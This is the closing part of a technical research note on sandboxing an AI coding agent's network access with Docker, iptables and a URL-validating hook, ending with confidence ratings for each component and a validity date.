- [Docker container capabilities](https://oneuptime.com/blog/post/2026-01-25-docker-container-capabilities/view) -- NET_ADMIN capability scope

### Tertiary (LOW confidence)
- iptables `--comment` module availability in python:3.11-slim -- not verified in container, needs testing
- DNS resolution from shared namespace with `dns: 127.0.0.1` -- behavior of Docker embedded DNS at 127.0.0.11 in shared namespace not verified

## Metadata

**Confidence breakdown:**
- Hook protocol: HIGH -- verified against current official docs (code.claude.com)
- URL extraction patterns: MEDIUM -- regex patterns are well-known but edge cases exist; fail-closed mitigates
- SQLite/validator logic: HIGH -- stdlib Python patterns, well-documented
- iptables architecture: MEDIUM -- shared namespace approach is sound but has DNS resolution open question
- iptables comment module: LOW -- needs runtime verification

**Research date:** 2026-04-08
**Valid until:** 2026-05-08 (30 days -- stable domain, moderate complexity)
